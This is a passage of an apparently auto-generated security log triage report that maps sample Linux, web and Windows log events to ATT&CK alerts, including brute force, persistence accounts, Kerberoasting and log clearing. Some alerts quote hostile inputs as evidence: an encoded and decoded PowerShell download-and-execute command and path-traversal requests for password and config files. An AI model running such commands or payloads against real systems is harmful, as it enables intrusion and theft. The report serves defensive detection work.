# Log triage report

Generated from 174 security events in: `sample_logs/audit.log`, `sample_logs/auth.log`, `sample_logs/web_access.log`, `sample_logs/dc01_security.jsonl`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`

| Severity | Alerts |
|---|---|
| critical | 6 |
| high | 10 |
| medium | 11 |
| low | 0 |

## MITRE ATT&CK coverage

| Technique | Name | Alerts |
|---|---|---|
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | 2 |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | 2 |
| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | 1 |
| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | 2 |
| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | 3 |
| [T1110](https://attack.mitre.org/techniques/T1110/) | Brute Force | 2 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | 3 |
| [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | 2 |
| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | 6 |
| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | 1 |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | 4 |
| [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Steal or Forge Kerberos Tickets: Kerberoasting | 1 |
| [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | Steal or Forge Kerberos Tickets: AS-REP Roasting | 1 |
| [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | 2 |
| [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | Active Scanning: Vulnerability Scanning | 2 |
| [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | Active Scanning: Wordlist Scanning | 1 |
| [T1685.005](https://attack.mitre.org/techniques/T1685/005/) | Disable or Modify Tools: Clear Windows Event Logs | 1 |

## Alerts

### 1. [CRITICAL] Successful login after repeated failures (AUTH-003)

- **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:55 UTC (25 events)
- **Host:** `web01`
- **User:** `root`
- **Source IP:** `203.0.113.45` (external)
- **ATT&CK:** T1110 Brute Force, T1078 Valid Accounts

root logged in from 203.0.113.45 after 24 failures from that IP in the previous 30 min (24 of them against this account). Treat as compromised until proven otherwise.

<details><summary>Evidence</summary>

```
Nov 10 02:13:06 web01 sshd[41220]: Failed password for root from 203.0.113.45 port 40000 ssh2
Nov 10 02:13:12 web01 sshd[41221]: Failed password for root from 203.0.113.45 port 40001 ssh2
Nov 10 02:13:21 web01 sshd[41222]: Failed password for root from 203.0.113.45 port 40002 ssh2
Nov 10 02:13:28 web01 sshd[41223]: Failed password for root from 203.0.113.45 port 40003 ssh2
Nov 10 02:13:33 web01 sshd[41224]: Failed password for root from 203.0.113.45 port 40004 ssh2
... 15 more ...
Nov 10 02:15:24 web01 sshd[41240]: Failed password for root from 203.0.113.45 port 40020 ssh2
Nov 10 02:15:33 web01 sshd[41241]: Failed password for root from 203.0.113.45 port 40021 ssh2
Nov 10 02:15:39 web01 sshd[41242]: Failed password for root from 203.0.113.45 port 40022 ssh2
Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 port 40023 ssh2
Nov 10 02:15:55 web01 sshd[41250]: Accepted password for root from 203.0.113.45 port 40031 ssh2
```

</details>

### 2. [CRITICAL] Newly created account added to privileged group (ACCT-003)

- **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:19:55 UTC (1 events)
- **Host:** `web01`
- **User:** `svc-backup`
- **ATT&CK:** T1098 Account Manipulation, T1136.001 Create Account: Local Account

'svc-backup' added to 'sudo' on web01, only 1 min after the account was created. Classic persistence pattern.

<details><summary>Evidence</summary>

```
Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
Nov 10 02:19:55 web01 usermod[41305]: add 'svc-backup' to group 'sudo'
```

</details>

### 3. [CRITICAL] Successful login after repeated failures (AUTH-003)

- **Time:** 2026-11-10 03:40:00 to 2026-11-10 03:41:30 UTC (15 events)
- **Host:** `web02`
- **User:** `root`
- **Source IP:** `203.0.113.60` (external)
- **ATT&CK:** T1110 Brute Force, T1078 Valid Accounts

root logged in from 203.0.113.60 after 14 failures from that IP in the previous 30 min (14 of them against this account). Treat as compromised until proven otherwise.

<details><summary>Evidence</summary>

```
node=web02 type=USER_AUTH msg=audit(1794282000.000:9102): pid=800 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282006.000:9104): pid=801 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282012.000:9106): pid=802 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282018.000:9108): pid=803 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282024.000:9110): pid=804 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
... 5 more ...
node=web02 type=USER_AUTH msg=audit(1794282060.000:9122): pid=810 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282066.000:9124): pid=811 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282072.000:9126): pid=812 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282078.000:9128): pid=813 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_LOGIN msg=audit(1794282090.200:9131): pid=900 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=login acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=success'
```

</details>

### 4. [CRITICAL] Newly created account added to privileged group (ACCT-003)

- **Time:** 2026-11-10 03:44:00 to 2026-11-10 03:45:00 UTC (1 events)
- **Host:** `web02`
- **User:** `systemd-sync`
- **ATT&CK:** T1098 Account Manipulation, T1136.001 Create Account: Local Account

'systemd-sync' added to 'wheel' on web02, only 0 min after the account was created. Classic persistence pattern.

<details><summary>Evidence</summary>

```
node=web02 type=ADD_USER msg=audit(1794282240.100:9133): pid=950 uid=0 auid=0 ses=7 msg='op=add-user acct=73797374656D642D73796E63 exe="/usr/sbin/useradd" hostname=? addr=? terminal=pts/0 res=success'
node=web02 type=USER_MGMT msg=audit(1794282300.000:9134): pid=960 uid=0 auid=0 ses=7 msg='op=add-user-to-group grp="wheel" acct="systemd-sync" exe="/usr/sbin/usermod" hostname=? addr=? terminal=pts/0 res=success'
```

</details>

### 5. [CRITICAL] Path traversal / local file inclusion attempt (WEB-002)

- **Time:** 2026-11-10 08:00:20 to 2026-11-10 08:01:20 UTC (4 events)
- **Source IP:** `203.0.113.99` (external)
- **ATT&CK:** T1190 Exploit Public-Facing Application

203.0.113.99 sent 4 request(s) trying to read files outside the web root; 1 got a 200 response with content, so a file may have been disclosed. Check the response size against the real file.

<details><summary>Evidence</summary>

```
203.0.113.99 - - [10/Nov/2026:08:00:20 +0000] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1789 "-" "curl/8.5.0"
203.0.113.99 - - [10/Nov/2026:08:00:40 +0000] "GET /download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1" 403 162 "-" "curl/8.5.0"
203.0.113.99 - - [10/Nov/2026:08:01:00 +0000] "GET /download.php?file=%252e%252e%252f%252e%252e%252fwindows%252fwin.ini HTTP/1.1" 404 153 "-" "curl/8.5.0"
203.0.113.99 - - [10/Nov/2026:08:01:20 +0000] "GET /download.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 0 "-" "curl/8.5.0"
```

</details>

### 6. [CRITICAL] Newly created account added to privileged group (ACCT-003)

- **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:43:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `helpdesk2`
- **ATT&CK:** T1098 Account Manipulation, T1136.001 Create Account: Local Account

'helpdesk2' added to 'Administrators' on WS-FIN-07.corp.example by thandi, only 2 min after the account was created. Classic persistence pattern.

<details><summary>Evidence</summary>

```
{"Computer": "WS-FIN-07.corp.example", "EventID": 4720, "SubjectUserName": "thandi", "TargetUserName": "helpdesk2", "TimeCreated": "2026-11-10T09:41:00Z"}
{"Computer": "WS-FIN-07.corp.example", "EventID": 4732, "MemberName": "CN=helpdesk2,CN=Users,DC=corp,DC=example", "SubjectUserName": "thandi", "TargetUserName": "Administrators", "TimeCreated": "2026-11-10T09:43:00Z"}
```

</details>

### 7. [HIGH] Password spraying from single source (AUTH-002)

- **Time:** 2026-11-10 04:13:27 to 2026-11-10 04:18:41 UTC (20 events)
- **Host:** `web01`
- **Source IP:** `198.51.100.77` (external)
- **ATT&CK:** T1110.003 Brute Force: Password Spraying

198.51.100.77 failed 20 logins against 10 different accounts. Many users with few attempts each is typical of spraying.

<details><summary>Evidence</summary>

```
Nov 10 04:13:27 web01 sshd[41310]: Failed password for invalid user admin from 198.51.100.77 port 52000 ssh2
Nov 10 04:13:52 web01 sshd[41311]: Failed password for invalid user oracle from 198.51.100.77 port 52001 ssh2
Nov 10 04:14:03 web01 sshd[41312]: Failed password for invalid user test from 198.51.100.77 port 52002 ssh2
Nov 10 04:14:24 web01 sshd[41313]: Failed password for ubuntu from 198.51.100.77 port 52003 ssh2
Nov 10 04:14:39 web01 sshd[41314]: Failed password for postgres from 198.51.100.77 port 52004 ssh2
... 10 more ...
Nov 10 04:17:33 web01 sshd[41325]: Failed password for git from 198.51.100.77 port 52015 ssh2
Nov 10 04:17:47 web01 sshd[41326]: Failed password for invalid user jenkins from 198.51.100.77 port 52016 ssh2
Nov 10 04:18:07 web01 sshd[41327]: Failed password for invalid user ftpuser from 198.51.100.77 port 52017 ssh2
Nov 10 04:18:18 web01 sshd[41328]: Failed password for invalid user pi from 198.51.100.77 port 52018 ssh2
Nov 10 04:18:41 web01 sshd[41329]: Failed password for invalid user support from 198.51.100.77 port 52019 ssh2
```

</details>

### 8. [HIGH] Executable or script written by Office application (FILE-001)

- **Time:** 2026-11-10 09:13:54 to 2026-11-10 09:13:54 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1105 Ingress Tool Transfer, T1204.002 User Execution: Malicious File

winword.exe wrote C:\Users\thandi\AppData\Local\Temp\~invoice.vbs. Hash the file and check whether it was executed.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\~invoice.vbs", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:13:54.000"}
```

</details>

### 9. [HIGH] Encoded PowerShell command (EXEC-001)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information

PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.

Decoded command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
```

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
```

</details>

### 10. [HIGH] Encoded PowerShell command (EXEC-001)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information

PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.

Decoded command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
```

<details><summary>Evidence</summary>

```
{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
```

</details>

### 11. [HIGH] Office application spawned a shell or script host (EXEC-002)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment

winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
```

</details>

### 12. [HIGH] Office application spawned a shell or script host (EXEC-002)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment

winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.

<details><summary>Evidence</summary>

```
{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
```

</details>

### 13. [HIGH] Password spraying from single source (AUTH-002)

- **Time:** 2026-11-10 09:20:00 to 2026-11-10 09:21:03 UTC (8 events)
- **Host:** `DC01.corp.example`
- **Source IP:** `10.20.4.17` (internal)
- **ATT&CK:** T1110.003 Brute Force: Password Spraying

10.20.4.17 failed 8 logins against 8 different accounts. Many users with few attempts each is typical of spraying.

<details><summary>Evidence</summary>

```
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:20:00Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "it-admin", "TimeCreated": "2026-11-10T09:20:09Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "sipho", "TimeCreated": "2026-11-10T09:20:18Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "lerato", "TimeCreated": "2026-11-10T09:20:27Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "svc_backup", "TimeCreated": "2026-11-10T09:20:36Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "svc_sql", "TimeCreated": "2026-11-10T09:20:45Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "helpdesk", "TimeCreated": "2026-11-10T09:20:54Z"}
{"Computer": "DC01.corp.example", "EventID": 4771, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "2", "Status": "0x18", "TargetUserName": "ceo", "TimeCreated": "2026-11-10T09:21:03Z"}
```

</details>

### 14. [HIGH] Kerberos TGT issued without pre-authentication (AS-REP roasting) (KERB-002)

- **Time:** 2026-11-10 09:24:00 to 2026-11-10 09:24:06 UTC (2 events)
- **Host:** `DC01.corp.example`
- **User:** `legacy-app, svc-scanner`
- **Source IP:** `10.20.4.17` (internal)
- **ATT&CK:** T1558.004 Steal or Forge Kerberos Tickets: AS-REP Roasting

2 TGT(s) for legacy-app, svc-scanner issued without pre-authentication to 10.20.4.17. The reply can be cracked offline. Enable pre-authentication on these accounts unless there is a documented reason.

<details><summary>Evidence</summary>

```
{"Computer": "DC01.corp.example", "EventID": 4768, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "0", "Status": "0x0", "TargetUserName": "svc-scanner", "TicketEncryptionType": "0x17", "TimeCreated": "2026-11-10T09:24:00Z"}
{"Computer": "DC01.corp.example", "EventID": 4768, "IpAddress": "::ffff:10.20.4.17", "PreAuthType": "0", "Status": "0x0", "TargetUserName": "legacy-app", "TicketEncryptionType": "0x17", "TimeCreated": "2026-11-10T09:24:06Z"}
```

</details>

### 15. [HIGH] Possible Kerberoasting (KERB-001)

- **Time:** 2026-11-10 09:26:00 to 2026-11-10 09:26:09 UTC (4 events)
- **Host:** `DC01.corp.example`
- **User:** `thandi`
- **Source IP:** `10.20.4.17` (internal)
- **ATT&CK:** T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting

thandi requested RC4-encrypted service tickets for 4 service accounts in 10 min. RC4 tickets can be cracked offline to recover the service account passwords. Rotate those passwords and check the requesting host.

<details><summary>Evidence</summary>

```
{"Computer": "DC01.corp.example", "EventID": 4769, "IpAddress": "::ffff:10.20.4.17", "ServiceName": "svc_sql", "Status": "0x0", "TargetUserName": "thandi@CORP.EXAMPLE", "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000", "TimeCreated": "2026-11-10T09:26:00Z"}
{"Computer": "DC01.corp.example", "EventID": 4769, "IpAddress": "::ffff:10.20.4.17", "ServiceName": "svc_web", "Status": "0x0", "TargetUserName": "thandi@CORP.EXAMPLE", "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000", "TimeCreated": "2026-11-10T09:26:03Z"}
{"Computer": "DC01.corp.example", "EventID": 4769, "IpAddress": "::ffff:10.20.4.17", "ServiceName": "svc_backup", "Status": "0x0", "TargetUserName": "thandi@CORP.EXAMPLE", "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000", "TimeCreated": "2026-11-10T09:26:06Z"}
{"Computer": "DC01.corp.example", "EventID": 4769, "IpAddress": "::ffff:10.20.4.17", "ServiceName": "svc_sharepoint", "Status": "0x0", "TargetUserName": "thandi@CORP.EXAMPLE", "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000", "TimeCreated": "2026-11-10T09:26:09Z"}
```

</details>

### 16. [HIGH] Security event log cleared (EVADE-001)

- **Time:** 2026-11-10 09:55:00 to 2026-11-10 09:55:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1685.005 Disable or Modify Tools: Clear Windows Event Logs

Security log on WS-FIN-07.corp.example was cleared by thandi. Attackers do this to hide their tracks; check what happened just before.

<details><summary>Evidence</summary>

```
{"Computer": "WS-FIN-07.corp.example", "EventID": 1102, "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:55:00Z"}
```

</details>

### 17. [MEDIUM] Brute force against account(s) (AUTH-001)

- **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:46 UTC (24 events)
- **Host:** `web01`
- **User:** `root`
- **Source IP:** `203.0.113.45` (external)
- **ATT&CK:** T1110.001 Brute Force: Password Guessing

203.0.113.45 failed 24 logins (at least 10 within 5 min).

<details><summary>Evidence</summary>

```
Nov 10 02:13:06 web01 sshd[41220]: Failed password for root from 203.0.113.45 port 40000 ssh2
Nov 10 02:13:12 web01 sshd[41221]: Failed password for root from 203.0.113.45 port 40001 ssh2
Nov 10 02:13:21 web01 sshd[41222]: Failed password for root from 203.0.113.45 port 40002 ssh2
Nov 10 02:13:28 web01 sshd[41223]: Failed password for root from 203.0.113.45 port 40003 ssh2
Nov 10 02:13:33 web01 sshd[41224]: Failed password for root from 203.0.113.45 port 40004 ssh2
... 14 more ...
Nov 10 02:15:17 web01 sshd[41239]: Failed password for root from 203.0.113.45 port 40019 ssh2
Nov 10 02:15:24 web01 sshd[41240]: Failed password for root from 203.0.113.45 port 40020 ssh2
Nov 10 02:15:33 web01 sshd[41241]: Failed password for root from 203.0.113.45 port 40021 ssh2
Nov 10 02:15:39 web01 sshd[41242]: Failed password for root from 203.0.113.45 port 40022 ssh2
Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 port 40023 ssh2
```

</details>

### 18. [MEDIUM] Local account created (ACCT-001)

- **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:18:55 UTC (1 events)
- **Host:** `web01`
- **User:** `svc-backup`
- **ATT&CK:** T1136.001 Create Account: Local Account

New account 'svc-backup' created on web01.

<details><summary>Evidence</summary>

```
Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
```

</details>

### 19. [MEDIUM] Brute force against account(s) (AUTH-001)

- **Time:** 2026-11-10 03:40:00 to 2026-11-10 03:41:18 UTC (14 events)
- **Host:** `web02`
- **User:** `root`
- **Source IP:** `203.0.113.60` (external)
- **ATT&CK:** T1110.001 Brute Force: Password Guessing

203.0.113.60 failed 14 logins (at least 10 within 5 min).

<details><summary>Evidence</summary>

```
node=web02 type=USER_AUTH msg=audit(1794282000.000:9102): pid=800 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282006.000:9104): pid=801 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282012.000:9106): pid=802 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282018.000:9108): pid=803 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282024.000:9110): pid=804 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
... 4 more ...
node=web02 type=USER_AUTH msg=audit(1794282054.000:9120): pid=809 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282060.000:9122): pid=810 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282066.000:9124): pid=811 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282072.000:9126): pid=812 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
node=web02 type=USER_AUTH msg=audit(1794282078.000:9128): pid=813 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
```

</details>

### 20. [MEDIUM] Local account created (ACCT-001)

- **Time:** 2026-11-10 03:44:00 to 2026-11-10 03:44:00 UTC (1 events)
- **Host:** `web02`
- **User:** `systemd-sync`
- **ATT&CK:** T1136.001 Create Account: Local Account

New account 'systemd-sync' created on web02.

<details><summary>Evidence</summary>

```
node=web02 type=ADD_USER msg=audit(1794282240.100:9133): pid=950 uid=0 auid=0 ses=7 msg='op=add-user acct=73797374656D642D73796E63 exe="/usr/sbin/useradd" hostname=? addr=? terminal=pts/0 res=success'
```

</details>

### 21. [MEDIUM] Directory or file brute forcing (many 404s from one source) (WEB-001)

- **Time:** 2026-11-10 07:00:00 to 2026-11-10 07:00:10 UTC (27 events)
- **Source IP:** `198.51.100.200` (external)
- **ATT&CK:** T1595.003 Active Scanning: Wordlist Scanning

198.51.100.200 requested 27 paths that do not exist (at least 20 within 5 min). Paths it found: 301 /files, 301 /uploads, 403 /server-status.

<details><summary>Evidence</summary>

```
198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /admin HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /backup HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /old HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /test HTTP/1.1" 404 153 "-" "gobuster/3.6"
